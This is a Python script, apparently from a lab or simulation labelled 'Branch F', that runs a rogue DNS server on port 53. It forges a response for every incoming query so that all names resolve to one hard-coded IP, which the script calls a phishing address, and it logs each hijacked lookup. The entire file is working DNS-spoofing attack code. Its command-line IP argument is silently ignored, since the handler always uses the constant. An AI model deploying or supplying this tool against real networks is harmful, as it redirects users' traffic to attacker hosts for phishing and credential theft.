#!/usr/bin/env python3
"""
DNS Hijack Injector (Branch F)
Runs a fake DNS server that returns rogue (simulated phishing) IPs.
"""
import socket
import struct
import sys
import signal
import threading

ROGUE_IP = "103.235.46.96"  # Simulated rogue IP

def dns_response_hijack(data, rogue_ip):
    """Build a forged DNS response with rogue IP."""
    if len(data) < 12:
        return None
    
    header = struct.unpack('!HHHHHH', data[:12])
    tid = header[0]
    flags = 0x8180  # QR=1, OPCODE=0, AA=0, TC=0, RD=1, RA=1, RCODE=0(NOERROR)
    
    # Parse question
    idx = 12
    qname_bytes = bytearray()
    while idx < len(data):
        length = data[idx]
        if length == 0:
            idx += 1
            break
        qname_bytes.extend(data[idx:idx+length+1])
        idx += length + 1
    
    qtype, qclass = struct.unpack('!HH', data[idx:idx+4])
    
    qdcount = header[1]
    ancount = 1
    
    resp_header = struct.pack('!HHHHHH', tid, flags, qdcount, ancount, 0, 0)
    
    # Answer section
    answer = bytearray()
    # Name pointer (compression)
    answer.extend(struct.pack('!H', 0xC00C))
    # Type A, Class IN
    answer.extend(struct.pack('!HH', qtype, qclass))
    # TTL (1 hour)
    answer.extend(struct.pack('!I', 3600))
    # RDLENGTH = 4 (IPv4)
    answer.extend(struct.pack('!H', 4))
    # Rogue IP
    for octet in rogue_ip.split('.'):
        answer.extend(struct.pack('!B', int(octet)))
    
    return bytes(resp_header) + bytes(qname_bytes) + struct.pack('!HH', qtype, qclass) + bytes(answer)

def extract_qname(data):
    idx = 12
    labels = []
    while idx < len(data):
        length = data[idx]
        if length == 0:
            break
        idx += 1
        labels.append(data[idx:idx+length].decode('ascii', errors='replace'))
        idx += length
    return '.'.join(labels)

def handle_query(data, addr, sock):
    qname = extract_qname(data)
    response = dns_response_hijack(data, ROGUE_IP)
    if response:
        sock.sendto(response, addr)
        print(f"[HIJACK] Forged response: {qname} -> {ROGUE_IP} from {addr[0]}:{addr[1]}")

def main():
    rogue = sys.argv[1] if len(sys.argv) > 1 else ROGUE_IP
    print(f"[DNS Hijack Injector] Listening on 0.0.0.0:53")
    print(f"[*] Forging responses with rogue IP: {rogue}")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', 53))

    def cleanup(signum, frame):
        sock.close()
        print("\n[Cleanup] Hijack server stopped")
        sys.exit(0)

    signal.signal(signal.SIGTERM, cleanup)
    signal.signal(signal.SIGINT, cleanup)

    while True:
        try:
            data, addr = sock.recvfrom(1024)
            t = threading.Thread(target=handle_query, args=(data, addr, sock))
            t.daemon = True
            t.start()
        except OSError:
            break

if __name__ == "__main__":
    main()
